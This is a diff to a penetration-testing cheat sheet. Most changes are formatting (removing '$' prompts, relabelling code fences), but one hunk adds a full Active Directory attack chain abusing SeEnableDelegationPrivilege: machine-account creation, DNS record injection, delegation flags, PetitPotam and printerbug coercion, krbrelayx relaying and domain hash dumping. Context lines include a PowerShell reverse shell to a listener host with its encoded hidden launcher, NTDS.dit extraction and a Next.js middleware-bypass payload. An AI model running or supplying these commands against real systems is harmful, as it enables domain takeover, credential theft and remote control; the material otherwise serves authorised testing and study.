@@ -1765,10 +1765,10 @@ ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://<RH
 -k            // ignore certificates
 --wildcard    // set wildcard option
 
-$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/
-$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php
-$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200
-$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<RHOST>:<RPORT>/ -b 200 -k --wildcard
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php
+gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200
+gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<RHOST>:<RPORT>/ -b 200 -k --wildcard
 ```
 
 ##### Common File Extensions
@@ -4237,11 +4237,11 @@ BruteForce $duration $threshold $passwords
 #### Metasploit
 
 ```shell
-$ sudo msfdb run                   // start database
-$ sudo msfdb init                  // database initialization
-$ msfdb --use-defaults delete      // delete existing databases
-$ msfdb --use-defaults init        // database initialization
-$ msfdb status                     // database status
+sudo msfdb run                   // start database
+sudo msfdb init                  // database initialization
+msfdb --use-defaults delete      // delete existing databases
+msfdb --use-defaults init        // database initialization
+msfdb status                     // database status
 msf6 > workspace                   // metasploit workspaces
 msf6 > workspace -a <WORKSPACE>    // add a workspace
 msf6 > workspace -r <WORKSPACE>    // rename a workspace
@@ -4620,8 +4620,8 @@ if __name__ == '__main__':
 
 ###### Execution
 
-```console
-$ python3 timecrack.py <FILE> /PATH/TO/WORDLIST/<WORDLIST>
+```shell
+python3 timecrack.py <FILE> /PATH/TO/WORDLIST/<WORDLIST>
 ```
 
 ###### Silver Tickets
@@ -4888,7 +4888,7 @@ certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
 ```shell
 certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -template '<TEMPLATE>' -save-old
 certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target <RHOST> -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>'
-$ certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
+certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
 ```
 
 or
@@ -5406,7 +5406,7 @@ evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIV
 
 ##### impacket-addcomputer
 
-```console
+```shell
 impacket-addcomputer -dc-ip <RHOST> -computer-name <MACHINE_ACCOUNT> -computer-pass <PASSWORD> <DOMAIN>/<USERNAME>:<PASSWORD>$ impacket-addcomputer -dc-ip <RHOST> -computer-name <MACHINE_ACCOUNT> -computer-pass <PASSWORD> <DOMAIN>/<USERNAME>:<PASSWORD>
 ```
 
@@ -5431,7 +5431,7 @@ impacket-dcomexec -dc-ip <RHOST> -object MMC20 -slientcommand <DOMAIN>/<USERNAME
 
 ##### impacket-describeTicket
 
-```console
+```shell
 impacket-describeTicket <FILE>.ccache
 ```
 
@@ -6681,7 +6681,7 @@ createX
 expose %cdrive% E:X
 end backupX
 ```
- 
+
 ```cmd
 diskshadow /s script.txt
 robocopy /b E:\Windows\ntds . ntds.dit
@@ -6689,6 +6689,130 @@ robocopy /b E:\Windows\ntds . ntds.dit
 
 ```shell
 impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
+```
+
+###### SeEnableDelegationPrivilege
+
+> https://github.com/Kevin-Robertson/Powermad
+
+> https://github.com/dirkjanm/krbrelayx
+
+> https://github.com/topotam/PetitPotam
+
+```shell
+netexec ldap <RHOST> -u '<USERNAME>' -p <PASSWORD> -M maq
+```
+
+###### Example 1
+
+```cmd
+New-MachineAccount -MachineAccount <MACHINE_ACCOUNT> -Password $(ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force)
+```
+
+```cmd
+Set-MachineAccountAttribute -MachineAccount <MACHINE_ACCOUNT> -Attribute useraccountcontrol -Value 528384
+```
+
+```cmd
+Set-MachineAccountAttribute -MachineAccount <MACHINE_ACCOUNT> -Attribute ServicePrincipalName -Value http/<RHOST> -Append
+```
+
+```cmd
+Get-MachineAccountAttribute -MachineAccount <MACHINE_ACCOUNT> -Attribute ServicePrincipalName -Verbose
+```
+
+```shell
+python3 dnstool.py -u '<DOMAIN>\<MACHINE_ACCOUNT>$' -p <PASSWORD> -r <RHOST> -d <LHOST> --action add -dns-ip <RHOST> <RHOST>
+```
+
+```shell
+iconv -f ASCII -t UTF-16LE <(printf '<PASSWORD>') | openssl dgst -md4
+```
+
+```shell
+python3 krbrelayx.py -hashes :7dfa0531d73101ca080c7379a9bff1c7 --target <RHOST>
+```
+
+```shell
+python3 printerbug.py -hashes :7dfa0531d73101ca080c7379a9bff1c7 <DOMAIN>/'<MACHINE_ACCOUNT>$'@<RHOST> <RHOST>
+```
+
+```shell
+export KRB5CCNAME=<FILE>.ccache
+```
+
+```shell
+impacket-secretsdump -k <RHOST> -just-dc-ntlm
+```
+
+###### Example 2
+
+```shell
+impacket-addcomputer -dc-ip <RHOST> -computer-name <MACHINE_ACCOUNT> -computer-pass <PASSWORD> <DOMAIN>/<USERNAME>:<PASSWORD>
+```
+
+```shell
+python3 dnstool.py -u '<DOMAIN>\<MACHINE_ACCOUNT>$' -p <PASSWORD> -r <RHOST> -d <LHOST> --action add <RHOST> -dns-ip <RHOST>
+```
+
+or
+
+```shell
+dnstool.py -u '<DOMAIN>\<MACHINE_ACCOUNT>$' -p '<PASSWORD>' --action add --record <RHOST> --data <LHOST> --type A -dns-ip <RHOST> <RHOST>
+```
+
+```shell
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac '<MACHINE_ACCOUNT>$' -f TRUSTED_FOR_DELEGATION
+```
+
+```shell
+python3 addspn.py -u '<DOMAIN>/<USERNAME>' -p '<PASSWORD>' -s 'cifs/<RHOST>' -t '<MACHINE_ACCOUNT>$' -dc-ip <RHOST> <RHOST> --additional
+```
+
+```shell
+python3 addspn.py -u '<DOMAIN>/<USERNAME>' -p '<PASSWORD>' -s 'cifs/<RHOST>' -t '<MACHINE_ACCOUNT>$' -dc-ip <RHOST> <RHOST>
+```
+
+```shell
+iconv -f ASCII -t UTF-16LE <(printf '<PASSWORD>') | openssl dgst -md4
+```
+
+or
+
+```shell
+python -c "password = '<PASSWORD>'; import hashlib; print(hashlib.new('md4', password.encode('utf-16le')).hexdigest())"
+```
+
+```shell
+python3 krbrelayx.py -hashes :7dfa0531d73101ca080c7379a9bff1c7 --target <RHOST>
+```
+
+```shell
+python3 PetitPotam.py -u '<MACHINE_ACCOUNT>$' -p '<PASSWORD>' <RHOST> <RHOST>
+```
+
+or
+
+```shell
+python3 printerbug.py -hashes :7dfa0531d73101ca080c7379a9bff1c7 <DOMAIN>/'<MACHINE_ACCOUNT>$'@<RHOST> <RHOST>
+```
+
+or
+
+```shell
+netexec smb <RHOST> -u '<MACHINE_ACCOUNT>$' -p '<PASSWORD>' -M coerce_plus 
+```
+
+```shell
+netexec smb <RHOST> -u '<MACHINE_ACCOUNT>$' -p '<PASSWORD>' -M coerce_plus -o LISTENER=<RHOST> METHOD=PrinterBug
+```
+
+```shell
+export KRB5CCNAME=<FILE>.ccache
+```
+
+```shell
+impacket-secretsdump -k <RHOST> -just-dc-ntlm
 ```
 
 ###### SeLoadDriverPrivilege
@@ -7049,7 +7173,7 @@ CipherString = DEFAULT:@SECLEVEL=1
 Alternatively you can create your own `openssl.cnf` and `export` the path to it.
 
 ```shell
-$ export OPENSSL_CONF=/PATH/TO/FOLDER/openssl.cnf
+export OPENSSL_CONF=/PATH/TO/FOLDER/openssl.cnf
 ```
 
 #### Port Scanning
@@ -7456,7 +7580,7 @@ JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUA
 ###### Alternatively using pwsh
 
 ```shell
-$ pwsh
+pwsh
 $Text = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
 $EncodedText =[Convert]::ToBase64String($Bytes)
@@ -7475,7 +7599,7 @@ for i in range(0, len(str), n):
 ```
 
 ```shell
-$ python3 script.py 
+python3 script.py 
 Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
 Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
 Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
@@ -8420,17 +8544,17 @@ else:
 
 ### Payloads
 
-```console
+```shell
 X-Middleware-Subrequest: middleware
 ```
 
-```console
+```shell
 x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
 ```
 
 ### Execution
 
-```console
+```shell
 curl -H "X-Middleware-Subrequest: middleware" https://<RHOST>/admin
 ```
 
